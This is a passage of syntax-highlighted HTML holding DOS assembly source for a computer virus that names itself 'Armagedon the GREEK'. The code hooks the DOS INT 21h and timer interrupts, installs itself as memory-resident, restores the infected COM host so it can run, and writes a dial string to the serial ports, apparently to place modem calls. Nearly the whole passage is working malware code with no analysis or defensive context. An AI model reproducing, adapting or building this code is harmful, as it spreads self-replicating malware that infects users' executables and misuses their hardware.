                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">init_done</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">exit_dial</span><span class="sc0">

</span><span class="sc5">send_one</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">cs</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">stringpos</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">strlen</span><span class="sc0">
                            </span><span class="sc6">jnz</span><span class="sc0">         </span><span class="sc5">do_send</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">sendret</span><span class="sc0">

</span><span class="sc5">do_send</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                            </span><span class="sc6">add</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">next_char</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3f8h</span><span class="sc0">
                            </span><span class="sc6">out</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">2f8h</span><span class="sc0">
                            </span><span class="sc6">out</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">2e8h</span><span class="sc0">
                            </span><span class="sc6">out</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3e8h</span><span class="sc0">
                            </span><span class="sc6">out</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc5">stringpos</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">exit_dial</span><span class="sc0">

</span><span class="sc5">sendret</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">retloop</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">14h</span><span class="sc0">
                            </span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">retloop</span><span class="sc0">

</span><span class="sc5">reset</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">call_made</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">stringpos</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">init_done</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">exit_dial</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">dial</span><span class="sc0">                    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">                                                                               </span><span class="sc1">; VIRUS' MEMORY INSTALLER </span><span class="sc0">
                            </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">         </span><span class="sc1">; </span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc0">                             </span><span class="sc1">; is VIRUS already </span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; in memory?</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0dadah</span><span class="sc0">                           </span><span class="sc1">; if yes then</span><span class="sc0">
                            </span><span class="sc6">jnz</span><span class="sc0">         </span><span class="sc5">cont</span><span class="sc0">                                    </span><span class="sc1">; terminate, else</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">already_in</span><span class="sc0">
</span><span class="sc5">cont</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">cs</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">                            </span><span class="sc1">; capture the old           </span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; INT 21h vector and</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">oldint21a</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                    </span><span class="sc1">; store the absolute address</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">oldint21b</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                    </span><span class="sc1">; in 'oldint21x' variables</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newint21</span><span class="sc0">      </span><span class="sc1">; point to new INT 21h ISR</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">                            </span><span class="sc1">; replace it to vector</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; </span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3508h</span><span class="sc0">                            </span><span class="sc1">; capture the old</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; timer vector and</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">oldint8a</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; store the address</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">oldint8b</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; in 'oldint8x' var</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newint8</span><span class="sc0">           </span><span class="sc1">; point to new timer ISR</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2508h</span><span class="sc0">                            </span><span class="sc1">; replace it to vector</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">;  </span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                              </span><span class="sc1">; get the current</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; time from DOS</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">cur_h</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                            </span><span class="sc1">; and store it</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">cur_m</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                            </span><span class="sc1">; for the </span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">cur_s</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                            </span><span class="sc1">; virus' timer</span><span class="sc0">
                            </span><span class="sc1">; RUN PROGRAM!</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">loop1</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                            </span><span class="sc6">jz</span><span class="sc0">          </span><span class="sc5">exitl1</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">loop1</span><span class="sc0">
</span><span class="sc5">exitl1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; SHRINK  BLOCK</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">

                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">81h</span><span class="sc4">]</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fcb1_seg</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fcb2_seg</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">cdline_seg</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">
                            </span><span class="sc1">;                   </span><span class="sc0">
                            </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ss_reg</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">sp_reg</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                            </span><span class="sc6">pushf</span><span class="sc0">
                            </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">oldint21a</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ss_reg</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">sp_reg</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last_byte</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">27h</span><span class="sc0">
                            
</span><span class="sc5">already_in</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e1h</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pokelabl</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fix_com</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">filesize</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc5">pokelabl</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">fix_com</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc4">+</span><span class="sc5">virlen</span><span class="sc0">
</span><span class="sc5">dofix</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">di</span><span class="sc0">
                            </span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">dofix</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">poklb</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">]</span><span class="sc0">
                            </span><span class="sc6">sub</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">poklb</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">signature</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc12">'Armagedon the GREEK'</span><span class="sc0">
</span><span class="sc5">last_byte</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">90h</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc0">
                            </span><span class="sc6">nop</span><span class="sc0">
                            </span><span class="sc6">nop</span><span class="sc0">
                            </span><span class="sc6">nop</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0">                    </span><span class="sc9">ends</span><span class="sc0">
                            </span><span class="sc9">end</span><span class="sc0">         </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
